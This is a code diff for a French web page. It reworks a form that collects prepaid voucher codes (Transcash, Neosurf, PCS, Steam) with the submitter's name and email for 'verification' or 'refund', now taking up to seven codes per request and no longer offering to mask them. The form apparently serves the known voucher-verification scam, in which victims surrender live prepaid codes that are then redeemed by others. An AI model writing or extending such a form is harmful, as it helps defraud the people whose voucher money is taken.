@@ -230,24 +230,24 @@
           </select>
         </div>
 
-        <!-- Code boxes -->
+        <!-- Nombre de tickets -->
+        <div id="ticket-count-section" class="hidden">
+          <label class="block text-sm font-semibold text-gray-700 mb-3">
+            Combien de tickets à vérifier ? <span class="text-red-400">*</span>
+          </label>
+          <div class="flex flex-wrap gap-2 mb-1" id="count-buttons"></div>
+          <p class="text-xs text-gray-400 mt-1">Maximum 7 tickets par demande.</p>
+        </div>
+
+        <!-- Code inputs -->
         <div id="code-section" class="hidden">
-          <div class="flex items-center justify-between mb-3">
+          <div class="mb-3">
             <label class="text-sm font-semibold text-gray-700">
-              Code <span class="text-red-400">*</span>
+              Code(s) <span class="text-red-400">*</span>
               <span id="code-format-hint" class="text-xs font-normal text-gray-400 ml-2"></span>
             </label>
-            <button type="button" onclick="toggleMask()" id="mask-btn"
-              class="flex items-center gap-1.5 text-xs text-gray-400 hover:text-navy transition-colors px-3 py-1.5 rounded-lg border border-gray-200 hover:border-gray-300">
-              <svg id="eye-icon" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
-                <path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
-              </svg>
-              <span id="mask-label">Masquer le code</span>
-            </button>
           </div>
-          <div id="code-boxes" class="flex flex-wrap items-center gap-2"></div>
-          <p class="text-xs text-gray-400 mt-2">Cliquez sur la première case et saisissez votre code — une case par caractère.</p>
+          <div id="code-inputs" class="space-y-2.5"></div>
         </div>
 
         <!-- Remboursement extra fields -->
@@ -390,10 +390,10 @@
 <script>
 /* ══════════════ CONFIG ══════════════ */
 const CODE_CONFIG = {
-  'Transcash': { length: 14, numeric: true,  groups: [7, 7],    hint: '14 chiffres' },
-  'Neosurf':   { length: 10, numeric: true,  groups: [5, 5],    hint: '10 chiffres' },
-  'PCS':       { length: 16, numeric: true,  groups: [4,4,4,4], hint: '16 chiffres' },
-  'STEAM':     { length: 15, numeric: false, groups: [5, 5, 5], hint: '15 caractères alphanumériques' }
+  'Transcash': { length: 12, numeric: true,  hint: '12 chiffres' },
+  'Neosurf':   { length: 10, numeric: true,  hint: '10 chiffres' },
+  'PCS':       { length: 10, numeric: false, hint: '10 caractères alphanumériques' },
+  'STEAM':     { length: 15, numeric: false, hint: '15 caractères alphanumériques' }
 };
 
 const STATUS_LABELS = {
@@ -405,7 +405,7 @@ const STATUS_ICONS = { pending:'⏳', processing:'🔍', valid:'✅', invalid:'�
 /* ══════════════ STATE ══════════════ */
 let currentService  = 'verification';
 let currentTypeName = '';
-let codeMasked      = false;
+let ticketCount     = 1;
 let lastDossier     = '';
 
 /* ══════════════ NAV ══════════════ */
@@ -460,112 +460,85 @@ async function loadTypes() {
   } catch {}
 }
 
-/* ══════════════ CODE BOXES ══════════════ */
+/* ══════════════ TICKETS & CODE INPUTS ══════════════ */
 function onTypeChange() {
   const sel = document.getElementById('f-type');
   const opt = sel.options[sel.selectedIndex];
   currentTypeName = opt?.dataset?.name || '';
-  const config = CODE_CONFIG[currentTypeName];
-  const section = document.getElementById('code-section');
+  const config      = CODE_CONFIG[currentTypeName];
+  const countSec    = document.getElementById('ticket-count-section');
+  const codeSec     = document.getElementById('code-section');
 
-  if (!config) { section.classList.add('hidden'); return; }
+  if (!config) { countSec.classList.add('hidden'); codeSec.classList.add('hidden'); return; }
 
   document.getElementById('code-format-hint').textContent = `(${config.hint})`;
-  section.classList.remove('hidden');
-  renderBoxes(config);
+  ticketCount = 1;
+  countSec.classList.remove('hidden');
+  renderCountButtons();
+  renderCodeInputs(1);
+  codeSec.classList.remove('hidden');
 }
 
-function renderBoxes(config) {
-  const container = document.getElementById('code-boxes');
+function renderCountButtons() {
+  const container = document.getElementById('count-buttons');
   container.innerHTML = '';
-  let idx = 0;
-  config.groups.forEach((size, gi) => {
-    const grp = document.createElement('div');
-    grp.className = 'flex gap-1.5';
-    for (let i = 0; i < size; i++) {
-      const box = document.createElement('input');
-      box.type = codeMasked ? 'password' : 'text';
-      box.maxLength = 1;
-      box.dataset.index = idx;
-      box.className = 'code-box';
-      box.autocomplete = 'off';
-      if (config.numeric) box.inputMode = 'numeric';
-      box.addEventListener('input',   e => handleInput(e, config));
-      box.addEventListener('keydown', e => handleKeydown(e));
-      box.addEventListener('paste',   e => handlePaste(e, config));
-      grp.appendChild(box);
-      idx++;
-    }
-    container.appendChild(grp);
-    if (gi < config.groups.length - 1) {
-      const sep = document.createElement('span');
-      sep.className = 'code-sep flex items-center';
-      sep.textContent = '–';
-      container.appendChild(sep);
-    }
-  });
-  container.querySelector('.code-box')?.focus();
-}
-
-function handleInput(e, config) {
-  let val = e.target.value;
-  if (config.numeric) val = val.replace(/\D/g, '');
-  else val = val.replace(/[^A-Z0-9]/gi, '').toUpperCase();
-  e.target.value = val.slice(-1);
-  e.target.classList.toggle('filled', !!e.target.value);
-  if (e.target.value) {
-    const next = document.querySelector(`.code-box[data-index="${+e.target.dataset.index + 1}"]`);
-    if (next) next.focus();
+  for (let i = 1; i <= 7; i++) {
+    const btn = document.createElement('button');
+    btn.type = 'button';
+    btn.textContent = i;
+    btn.className = i === ticketCount
+      ? 'w-10 h-10 rounded-xl font-bold text-sm btn-gold'
+      : 'w-10 h-10 rounded-xl font-bold text-sm border-2 border-gray-200 text-gray-600 hover:border-gray-400 transition-colors';
+    btn.onclick = () => onCountChange(i);
+    container.appendChild(btn);
   }
 }
 
-function handleKeydown(e) {
-  if (e.key === 'Backspace' && !e.target.value) {
-    const prev = document.querySelector(`.code-box[data-index="${+e.target.dataset.index - 1}"]`);
-    if (prev) { prev.value = ''; prev.classList.remove('filled'); prev.focus(); }
-  }
-  if (e.key === 'ArrowLeft') {
-    const prev = document.querySelector(`.code-box[data-index="${+e.target.dataset.index - 1}"]`);
-    if (prev) prev.focus();
-  }
-  if (e.key === 'ArrowRight') {
-    const next = document.querySelector(`.code-box[data-index="${+e.target.dataset.index + 1}"]`);
-    if (next) next.focus();
-  }
+function onCountChange(n) {
+  ticketCount = n;
+  renderCountButtons();
+  renderCodeInputs(n);
 }
 
-function handlePaste(e, config) {
-  e.preventDefault();
-  let text = e.clipboardData.getData('text');
-  if (config.numeric) text = text.replace(/\D/g, '');
-  else text = text.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+function renderCodeInputs(n) {
+  const config    = CODE_CONFIG[currentTypeName];
+  const container = document.getElementById('code-inputs');
+  const existing  = [...container.querySelectorAll('.code-single-inp')].map(i => i.value);
+  container.innerHTML = '';
+  for (let i = 0; i < n; i++) {
+    const row = document.createElement('div');
+    row.className = 'flex items-center gap-3';
 
-  const boxes = [...document.querySelectorAll('.code-box')];
-  const start = +e.target.dataset.index;
-  [...text].forEach((ch, i) => {
-    if (boxes[start + i]) {
-      boxes[start + i].value = ch;
-      boxes[start + i].classList.add('filled');
-    }
-  });
-  const last = boxes[Math.min(start + text.length, boxes.length - 1)];
-  if (last) last.focus();
+    const num = document.createElement('span');
+    num.className = 'text-xs font-bold text-gray-400 w-5 shrink-0 text-right';
+    num.textContent = n > 1 ? `${i + 1}.` : '';
+
+    const inp = document.createElement('input');
+    inp.type         = 'text';
+    inp.className    = 'code-single-inp inp font-mono tracking-widest text-base flex-1';
+    inp.placeholder  = `Entrez votre code (${config ? config.hint : '···'})`;
+    inp.maxLength    = config ? config.length : 30;
+    inp.autocomplete = 'off';
+    inp.value        = existing[i] || '';
+    if (config?.numeric) inp.inputMode = 'numeric';
+    inp.addEventListener('input', () => {
+      let v = inp.value.toUpperCase();
+      if (config?.numeric) v = v.replace(/\D/g, '');
+      else v = v.replace(/[^A-Z0-9]/g, '');
+      inp.value = v.slice(0, config?.length ?? 30);
+    });
+
+    row.appendChild(num);
+    row.appendChild(inp);
+    container.appendChild(row);
+  }
+  container.querySelector('.code-single-inp')?.focus();
 }
 
-function getCode() {
-  return [...document.querySelectorAll('.code-box')].map(b => b.value).join('');
-}
-
-/* ══════════════ MASKING ══════════════ */
-function toggleMask() {
-  codeMasked = !codeMasked;
-  document.querySelectorAll('.code-box').forEach(b => {
-    b.type = codeMasked ? 'password' : 'text';
-  });
-  document.getElementById('mask-label').textContent = codeMasked ? 'Afficher le code' : 'Masquer le code';
-  document.getElementById('eye-icon').innerHTML = codeMasked
-    ? `<path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>`
-    : `<path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>`;
+function getCodes() {
+  return [...document.querySelectorAll('.code-single-inp')]
+    .map(i => i.value.trim().toUpperCase())
+    .filter(Boolean);
 }
 
 /* ══════════════ SUBMIT ══════════════ */
@@ -575,7 +548,7 @@ async function submitForm() {
   const email  = document.getElementById('f-email').value.trim();
   const typeEl = document.getElementById('f-type');
   const typeId = typeEl.value;
-  const code   = getCode();
+  const codes  = getCodes();
   const errEl  = document.getElementById('form-error');
   errEl.classList.add('hidden');
 
@@ -585,15 +558,19 @@ async function submitForm() {
   if (!prenom) { showErr(errEl, 'Veuillez saisir votre prénom.'); return; }
   if (!email || !email.includes('@')) { showErr(errEl, 'Veuillez saisir un email valide.'); return; }
   if (!typeId) { showErr(errEl, 'Veuillez sélectionner un type de code.'); return; }
-  if (config && code.length < config.length) {
-    showErr(errEl, `Le code ${currentTypeName} doit contenir ${config.length} caractères (${code.length}/${config.length}).`); return;
+  if (codes.length === 0) { showErr(errEl, 'Veuillez saisir au moins un code.'); return; }
+  if (config) {
+    const badCode = codes.find(c => c.length !== config.length);
+    if (badCode) {
+      showErr(errEl, `Code invalide : "${badCode}" — ${currentTypeName} requiert exactement ${config.length} caractères.`);
+      return;
+    }
   }
-  if (!code) { showErr(errEl, 'Veuillez saisir votre code.'); return; }
 
   const body = {
     service_type: currentService,
     code_type_id: +typeId,
-    code, nom, prenom, email
+    code: codes.join(', '), nom, prenom, email
   };
   if (currentService === 'remboursement') {
     body.montant = document.getElementById('f-montant').value.trim() || null;
@@ -623,12 +600,13 @@ function resetForm() {
   document.getElementById('f-type').value = '';
   document.getElementById('f-montant').value = '';
   document.getElementById('f-motif').value = '';
-  document.getElementById('code-boxes').innerHTML = '';
+  document.getElementById('code-inputs').innerHTML = '';
   document.getElementById('code-section').classList.add('hidden');
+  document.getElementById('ticket-count-section').classList.add('hidden');
   document.getElementById('form-error').classList.add('hidden');
   document.getElementById('form-card').classList.remove('hidden');
   document.getElementById('success-card').classList.add('hidden');
-  codeMasked = false;
+  ticketCount = 1;
 }
 
 function goTrack() {
